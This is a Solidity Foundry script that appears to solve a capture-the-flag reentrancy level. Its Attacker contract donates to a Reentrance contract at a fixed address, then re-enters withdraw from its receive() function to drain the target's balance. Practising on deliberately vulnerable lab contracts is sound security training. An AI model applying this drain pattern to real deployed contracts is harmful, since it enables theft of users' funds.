// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast_6.sol";
import {Reentrance} from "../src/L10Reentrancy.sol";

contract Attacker {
    Reentrance reentranceInstance = Reentrance(payable(0x2925cE379BCa1f75f94B31aF463aD05FaD7050AA));
    uint256 constant DONATION = 0.001 ether;

    constructor() public payable {
        donate();
    }

    function donate() internal {
        reentranceInstance.donate{value: DONATION}(address(this));
        console.log("Balance of attacker after donation:", reentranceInstance.balanceOf(address(this)));
    }

    function withdraw() external {
        reentranceInstance.withdraw(DONATION);
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
        console.log("Contract balance", address(reentranceInstance).balance);
    }

    receive() external payable {
        console.log("Receive function called");
        uint256 targetBalance = address(reentranceInstance).balance;
        console.log("Target balance:", targetBalance);
        reentranceInstance.withdraw(DONATION);
    }
}

contract L10ReentrancyAttack is Script, Broadcast {
    function run() public broadcast {
        Attacker attacker = new Attacker{value: 10 ether}();
        attacker.withdraw();
    }
}
